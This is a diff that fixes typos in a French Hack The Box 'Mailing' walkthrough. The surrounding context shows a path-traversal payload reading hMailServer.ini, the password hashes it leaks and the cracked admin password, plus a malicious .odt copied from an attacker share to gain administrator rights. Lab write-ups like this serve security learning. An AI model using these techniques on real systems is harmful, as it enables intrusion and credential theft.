@@ -123,7 +123,7 @@ Nous obtenons une réponse positive et pouvons lire le fichier.
 
 L'étape suivante sera d'essayer de lire quelques fichiers sensibles. Nous savons que la cible utilise hmailserver donc nous nous concentrerons sur ce dernier, cherchons `hmailserver ini ile location` sur Google.
 
-Ce [post](https://www.hmailserver.com/forum/viewtopic.php?t=29069) nous dit que par défaut le fichier ini est dans `C:\NProgram Files\NMailServer\NBin` mais en utilisant `../../Program+Files/hMailServer/Bin/hMailServer.ini` pour le payload nous obtenons le résultat `File not found`.
+Ce [post](https://www.hmailserver.com/forum/viewtopic.php?t=29069) nous dit que par défaut le fichier ini est dans `C:\Program Files\MailServer\Bin` mais en utilisant `../../Program+Files/hMailServer/Bin/hMailServer.ini` pour le payload nous obtenons le résultat `File not found`.
 
 Ce [forum]((https://www.hmailserver.com/forum/viewtopic.php?t=38903)) nous apprend que le fichier ini peut également se trouver dans `program files (x86)\hMailServer\Bin\hMailServer.ini`.
 
@@ -133,7 +133,7 @@ En utilisant le chemin `../../Program Files (x86)/hMailServer/Bin/hMailServer.in
 
 ![INI file - passwords found](/images/HTB-Mailing/INI-file-pwds.png)
 
-Le fichier contient deux hachages de mots de passe, le mot de passe administratif qui est `841bb5acfa6779ae432fd7a4e6600ba7` et un mot de passe utilisateur `0a9f8ad8bf896b501dde74f08efd7e4c`. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).
+Le fichier contient deux hachages de mots de passe, le mot de passe administrateur qui est `841bb5acfa6779ae432fd7a4e6600ba7` et un mot de passe utilisateur `0a9f8ad8bf896b501dde74f08efd7e4c`. Il révèle également les répertoires du logiciel et la base de données utilisée (MSSQL).
 
 À l'aide de [CrackStation](https://crackstation.net/), nous trouvons le mot de passe de l'administrateur, `homenetworkingadministrator`.
 
@@ -280,7 +280,7 @@ cd 'Important Documents'
 copy \\MY_IP\mailing\exploit.odt
 ```
 
-4. Attendez 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe `Administradores` avec `net user maya`
+4. Attendre 1 à 2 minutes puis confirmez que Maya fait maintenant partie du groupe `Administradores` avec `net user maya`
 
 ![maya now part of admin group](/images/HTB-Mailing/maya_admin.png)
 
